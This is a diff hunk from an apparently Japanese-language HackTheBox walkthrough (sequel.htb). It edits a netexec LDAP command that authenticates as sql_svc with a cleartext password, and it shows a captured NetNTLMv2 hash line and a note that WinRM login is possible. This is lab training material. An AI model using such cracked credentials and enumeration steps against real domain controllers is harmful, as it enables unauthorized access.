@@ -283,7 +283,7 @@ SQL_SVC::sequel:b964916c38c95c45:e50990e2249a62e23a3f59ad32b1fa11:01010000000000
 ```
 STEP1で5985番オープンを確認、またsql_svcはwinrmログイン可能を確認
 ```sh
-└─$ netexec ldap 10.129.80.180 -u 'sequel.htb\sql_svc' -p 'REGGIE1234ronnie' --groups 'Remote Management Users'
+└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --groups 'Remote Management Users'
 LDAP        10.129.80.180   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
 LDAPS       10.129.80.180   636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
 LDAPS       10.129.80.180   636    DC               sql_svc
